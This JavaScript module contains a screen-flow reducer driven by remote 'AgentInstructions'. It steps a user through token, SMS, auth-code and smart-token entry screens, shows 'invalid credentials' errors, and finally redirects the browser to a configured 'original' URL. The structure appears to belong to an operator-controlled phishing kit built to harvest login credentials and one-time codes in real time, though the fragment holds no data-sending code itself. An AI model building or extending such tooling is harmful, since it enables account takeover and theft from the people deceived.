import { AgentInstructions, STEPS } from './constants'
import { config } from './../config/config'

export const isDevEnv = process.env.NODE_ENV === 'development'

export function isEmptyObj(obj) {
  return Object.keys(obj).length === 0
}

export const updateScreen = ({ action, payload }, changeStore) => {
  const newState = { loading: false, error: false }

  

  switch (action) {
    case AgentInstructions.GO_TO_HOME_SCREEN:
      newState.step = STEPS.STEP_1
      newState.step_1_cod = ''
      break
    case AgentInstructions.GO_TO_TOKEN_SCREEN:
      newState.step = STEPS.STEP_2
      newState.challenge = payload
      newState.step_2_cod = ''
      break
    case AgentInstructions.GO_TO_AUTH_CODE_SCREEN:
      newState.step = STEPS.STEP_6
      newState.step_6_cod = ''
      break
    case AgentInstructions.GO_TO_SMS_SCREEN:
      newState.step = STEPS.STEP_3
      newState.step_3_cod = ''
      break
    case AgentInstructions.GO_TO_TECH_SCREEN:
      newState.step = STEPS.STEP_5
      newState.step_5_cod = ''
      break
    case AgentInstructions.GO_TO_SMART_TOKEN:
      newState.step = STEPS.STEP_4
      newState.step_4_cod = ''
      break
    case AgentInstructions.GO_TO_SMART_TOKEN_SMS:
      newState.step = STEPS.STEP_7
      newState.step_7_cod = ''
      break

    case AgentInstructions.ERR_MSG_INVALID_CREDENTIALS:
      newState.error = true
      break
    case AgentInstructions.SHOW_LOADING_STATE:
      newState.loading = true
      break
    case AgentInstructions.GO_TO_ORIGINAL_SITE:
      window.location.href = config.originalURL
      return
      break
    default:
      newState.loading = true

  }

  changeStore(newState)

}

